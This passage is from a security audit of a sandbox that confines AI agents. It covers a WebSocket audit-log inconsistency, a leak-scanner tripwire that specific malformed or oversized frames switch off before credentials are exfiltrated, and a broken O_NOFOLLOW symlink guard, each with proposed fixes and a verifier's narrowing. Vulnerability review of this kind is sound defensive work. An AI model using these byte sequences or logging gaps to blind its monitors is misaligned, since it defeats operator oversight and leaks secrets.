**Constat.** forward.rs:90 computes `let verb = if ws_upgrade { "WS" } else { method };` and uses it at line 95 (`decide_https`), line 103 (the refusal sentence) and line 118 (the `ws-injection-refused` outcome) — i.e. on every path that *refuses*. Every path that *allows* still passes the literal `method`: `resolve_checked` at line 138, the SSRF/DNS refusal logging that hangs off it, the `signer-refused` and body-cap outcomes at lines 205/246/285, and — the one that matters — the single `allow` record `ctx.outcome_l7(..., Some(method), Some(&path), StatKind::Allow, "allowed")` at line 340, which is also the event `ctx.set_status(allow_seq, code)` at line 554 amends. tunnel.rs takes the other approach: it rewrites `imethod` itself at line 138-142 so every downstream use names `WS`, and its comment at tunnel.rs:565-568 asserts the invariant this plane breaks — "step 4 rewrites `imethod` to `WS` the moment the handshake is recognised, so the verdict, the log and the stats all name it". The result is an audit trail where WebSocket *denials* on this plane appear as `WS` and WebSocket *allows* appear as `GET`.

**Scénario.** With `{WS} api.example.com:*` allowed, an in-cage agent sends its WebSocket handshake as an absolute-form request (`GET https://api.example.com/socket HTTP/1.1` with the upgrade headers) rather than through a CONNECT. The handshake is correctly admitted under the `WS` rule, but `sbx net logs`, `sbx net stats`, and the `[notify] events.network` feed all record `GET /socket`. An operator auditing which hosts a launch opened the unredactable bidirectional capability to — or grepping the feed for `WS` — sees nothing, while the same handshake over CONNECT is fully attributed. The agent chooses which transport carries the handshake, so this is a reporting channel it controls.

**Correction proposée.** Pass `verb` instead of `method` to the `ctx.outcome_l7` call at line 340 and to the `resolve_checked`/`push_log`/`ctx.outcome` calls at lines 138, 169, 205, 246, 285, 410, 458 and 554. Keep `method` for `relay_response_head` (line 546) and `response_framing`, which must see the literal verb to frame the response correctly — that split is why simply rebinding `method` the way tunnel.rs does is not available here.

**Rectification du vérificateur.** The mechanism is right but the impact is misdescribed. No 'unredactable bidirectional capability' is opened on this plane, so none is being hidden: forward.rs:37-42 states that it relays one request and one response and cannot switch protocols, and the code backs that — the forwarded head goes through `reserialize_request` (forward.rs:381/443), which strips `Connection` (mod.rs:1340) and appends `Connection: close`/keep-alive (mod.rs:1380), while `reserialize_upgrade` — the only reserializer preserving the upgrade tokens — is called solely from the tunnel path (websocket.rs:835). What actually crossed the wire was a `GET`, so the log entry is not false about the traffic; the defect is the intra-plane inconsistency (deny records name `WS`, the one allow record names `GET`), a log-consistency nit rather than an audit hole about a granted capability. Also, tunnel.rs:565-568's invariant is scoped to tunnel.rs and is true there, so no comment lies about forward.rs.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Confirmed line by line: forward.rs:90 binds `verb`, and it is used only at :95 (`decide_https`), :103 (refusal sentence) and :118 (`ws-injection-refused`). Every other site passes the literal `method` — :138, :169, :205, :246, :285, :328, :340, :410, :458, :554 — and :340 is the single `ctx.outcome_l7(... StatKind::Allow, "allowed")` record for the exchange. Nothing between the verdict and :340 re-derives the verb, and an allowed WS handshake on this plane is reachable (a `{WS}` rule admits it at :95, and the :113 injection refusal only fires when a credential matches), so an allowed WebSocket handshake on the absolute-form plane is recorded, counted, and status-amended (:554, :569) as `GET` while a refused one is recorded as `WS`. No comment claims the split is deliberate for the record-keeping sites.

</details>

---

### S39 — Any framing/decode giveup silently switches the leak tripwire off for the rest of the tunnel while the relay keeps forwarding
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/proxy/websocket.rs:524` |
| **Catégorie** | `fail-open` |
| **Sous-système** | Proxy — WebSocket |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `FrameTee::push` opens with `if self.done { return false; }` (lines 524-526), and `done` is set on five paths the cage controls: a reserved opcode (`HeaderScan::Bad`, line 538), a compressed message past `compressed_budget()` (line 611), an inflate failure (line 701), and a window the drain could not square (line 689).

`done` is private and nothing outside the tee can observe it. `follow()` (lines 1006-1021) only looks at `push`'s return ("did the capture sink fill") and `sightings()`. So once `done` is set, `LeakScan` never sees another byte, `sightings()` is empty forever, `blocking` (line 1100) can never fire — and `relay_websocket` carries on relaying every byte in both directions (line 1158).

The comments frame this as a capture-fidelity decision ("the transcript ends at the last message actually decoded", lines 606-610; "nothing further can be trusted for this direction", 699-700). But the same file already states this exact outcome is unacceptable for the *scan*: lines 341-345 say a decoder that goes blind mid-tunnel is "a security control the cage switches off at will — one large compressible message, then exfiltrate freely down the same tunnel", and the whole `Inflater::drain`/`in_step` machinery exists to close it. Closing one door while four cheaper ones stay open — and one of them (line 689) is the `in_step` machinery itself falling back to `done` — means the property that machinery was built to guarantee does not hold. `allowlist/mod.rs:807-813` documents `Block` as "Record it and close the tunnel"; a blinded scan records nothing and closes nothing.

**Scénario.** Cheapest variant, pinned by the file's own test at lines 1728-1741: on a `permessage-deflate`-negotiated tunnel the cage sends 8 bytes — `c1 06 ff ff ff ff ff ff` (FIN|RSV1|text, 6 bytes of non-DEFLATE) — `Inflater::message` returns `None`, `end_of_frame` sets `self.done = true` (line 701), and from that instant the outbound `LeakScan` is dead. The cage then sends the credential in ordinary text frames; `push` returns immediately at line 525, `follow` reports nothing, `websocket_secret = block` never triggers, and the relay delivers every byte to the upstream. A protocol-legal variant needing no deflate negotiation at all: two bytes `83 00` (reserved opcode 0x3) reach `HeaderScan::Bad` → line 538. A variant that is legal WebSocket end-to-end: one compressed message whose payload exceeds `compressed_budget()` (>=1 MiB) trips line 611.

**Correction proposée.** Distinguish "nothing left to learn" (`spent()`: sink full, no scan) from "the decoder lost the framing while a scan was configured". Expose the latter (e.g. `fn blinded(&self) -> bool { self.done && self.scan.is_some() && !self.spent() }`) and have `follow()`/`relay_websocket` treat it as a policy event: record it on the tunnel's event via `ctx` so `sbx net logs` shows the tripwire stopped, and under `WebsocketSecret::Block` tear the tunnel down on the same path as a sighting (lines 1152-1156) rather than relaying unwatched bytes.

**Rectification du vérificateur.** Survives only in a narrower form than stated. The one path that genuinely contradicts websocket.rs:341-345 ("a security control the cage switches off at will — one large compressible message, then exfiltrate freely down the same tunnel", the reason `Inflater::drain`/`in_step` exists) is the compressed-budget giveup at websocket.rs:605-612: with a scan configured `plaintext_cap` is 256 KiB so `compressed_budget()` is 1 MiB, and a single protocol-legal >1 MiB compressed message blinds the direction permanently — the same outcome the in_step machinery was built to prevent, reached on the compressed side instead of the plaintext side. That is the finding worth writing, and it is a defense-in-depth/observability gap (no record that the tripwire stopped) rather than a new exfiltration channel, since the split-across-messages evasion is documented as out of scope. The reserved-opcode and decode-failure framings should be dropped; the `in_step` fallback at :689 is the machinery reporting its own give-up, not a fifth hole.

<details>
<summary>Preuve retenue par le vérificateur</summary>

The mechanism is accurate — `push` returns at websocket.rs:524-526, `done` is private, `follow` (websocket.rs:1006-1021) only reads the push return and `sightings()`, and the relay keeps forwarding — but three of the five paths carry an explicit rationale and one is pinned by a test. websocket.rs:605-612 and :698-702 both state the reasoning (raw DEFLATE consumed as text would file the compressor's output as the message and hand the scan bytes no needle can match), and `a_compressed_message_that_does_not_decode_stops_the_direction` (websocket.rs:1726-1741) pins the decode-failure behaviour deliberately. The two paths the auditor markets as the cheap attack are the weakest: `83 00` (HeaderScan::Bad, :538) and a 6-byte non-DEFLATE payload (:701) describe a stream any conformant peer fails the connection on, so they only work against an upstream the attacker already owns — and against that upstream the byte-exact per-message scan (websocket.rs:100-106, carry cleared by `start_message` at :143-146) is already evaded for free by splitting the secret across two messages, which allowlist/mod.rs:807-813 documents as the bound of `Block`.

</details>

---

### S40 — The `O_NOFOLLOW` guard in `serve_open` never fires: `O_PATH|O_NOFOLLOW` succeeds on a symlink
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/proc_enforce.rs:1298` |
| **Catégorie** | `parser-confusion` |
| **Sous-système** | Seccomp et politique d'exec |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `serve_open` strips `O_NOFOLLOW` from the reopen (line 1310) because `/proc/self/fd/<n>` is itself a link, and claims to answer the flag itself: "It is decided here instead, against the same path, and answered the way the kernel would have." The decision is `libc::open(path, O_PATH | O_NOFOLLOW | O_CLOEXEC)` and `if link_probe < 0 { respond_errno(ELOOP) }`. That is backwards. `open(2)` is explicit: "If pathname is a symbolic link and the `O_NOFOLLOW` flag is also specified [with `O_PATH`], then the call returns a file descriptor referring to the symbolic link." So for exactly the case the guard exists to catch — a symlink final component — `link_probe` is >= 0, the branch closes the descriptor and falls through, and the cage is served the probe, which `probe_and_vouch` (:2429) opened *without* `O_NOFOLLOW` on purpose and which therefore names the link's target. The guard is also wrong in the other direction: any non-symlink failure of that reopen (the file was unlinked, a parent became untraversable) is reported to the cage as `ELOOP`. No test covers this branch — `grep -n -i nofollow` over the file returns only the four lines of the implementation. This is the same defect class as the `openat2` `resolve` check added right beside it at line 1265 ("a program inside the cage that hardened its own path walk must not have that hardening quietly removed by being supervised"); that one was closed, this one was not.

**Scénario.** Requires `[fs] scan` armed (the open lens). A hostile agent in the cage plants `ln -s <in-cage target> /work/build.log`, then a tool the user's agent invokes opens its log defensively with `open("/work/build.log", O_WRONLY|O_CREAT|O_NOFOLLOW, 0644)` — the standard defence against exactly this symlink swap. Unsupervised the kernel answers `ELOOP` and the tool refuses. Supervised, `open_is_refused` probes with `O_PATH` (following the link), `serve_open` reaches line 1289, `libc::open(path, O_PATH|O_NOFOLLOW|O_CLOEXEC)` returns a valid descriptor to the *symlink*, the branch treats that as "not a link", and `respond_with_fd` hands the cage a write descriptor on the link's target. sbx's supervision has removed a kernel guarantee the in-cage program explicitly asked for.

**Correction proposée.** Test the final component rather than relying on the open to fail. Either `fstat` the descriptor the `O_PATH|O_NOFOLLOW` open returns and answer `ELOOP` when `S_ISLNK(st_mode)`, or replace the probe with `fstatat(AT_FDCWD, target, &st, AT_SYMLINK_NOFOLLOW)` and answer `ELOOP` on `S_ISLNK`. Keep the existing `link_probe < 0` path only for a genuine resolution failure, and answer it with the errno the probe actually met (through `errno_describes_the_file`) rather than a blanket `ELOOP`.

**Rectification du vérificateur.** Two corrections. (1) The 'wrong in the other direction' half is already documented as accepted, not a defect: the comment immediately above at :1286-1288 says 'Re-walking the path is a second resolution... The two outcomes of losing that race are a spurious `ELOOP` and serving the inode that was scanned', so a non-symlink failure being answered `ELOOP` is a deliberate, stated trade. Only the first half — the guard never firing — is the bug. (2) Severity is medium-overstated. The served descriptor cannot reach a host-only file: `vouched_probe` (:2356-2382) requires the probe's mount id to be one the cage's own namespace holds, or re-walks it through the cage root, so the whole effect stays inside the cage's own trust domain and crosses no sbx boundary. What this is, precisely, is 100% dead security code plus a comment that claims the opposite — worth fixing on the codebase's own stated standard (the `openat2` `resolve` decline at :1258-1265: 'a program inside the cage that hardened its own path walk must not have that hardening quietly removed by being supervised'), but not a sandbox-escape-class defect. It also requires the opt-in `[fs] scan` lens to be armed.

<details>
<summary>Preuve retenue par le vérificateur</summary>

The lines are real and the kernel semantics are as stated. src/sandbox/proc_enforce.rs:1289-1305 is the guard; :1298 is `libc::O_PATH | libc::O_NOFOLLOW | libc::O_CLOEXEC` and the only failure branch is `if link_probe < 0 { respond_errno(..., ELOOP) }` at :1300-1303, after which the descriptor is closed at :1305 and the call falls through to the reopen at :1310, which strips `O_NOFOLLOW`. open(2) is explicit that `O_PATH` plus `O_NOFOLLOW` on a symlink final component RETURNS a descriptor referring to the symlink rather than failing, so the one case the guard exists to catch takes the success path. The probe it then serves is opened without `O_NOFOLLOW` on purpose (`probe_and_vouch`, :2429-2430: 'Deliberately **without** `O_NOFOLLOW`'), and `reopen_probe` (:1562-1570) reopens `/proc/self/fd/<probe>`, which names the link's target. I checked for a guard elsewhere: `grep -i nofollow` over the file returns only :1281, :1289, :1298, :1308, :1310 and :2429 — nothing tests the final component's type, and no test exercises the branch. The comment at :1283-1284 ('It is decided here instead, against the same path, and answered the way the kernel would have') therefore asserts a property the code does not have.

</details>

---

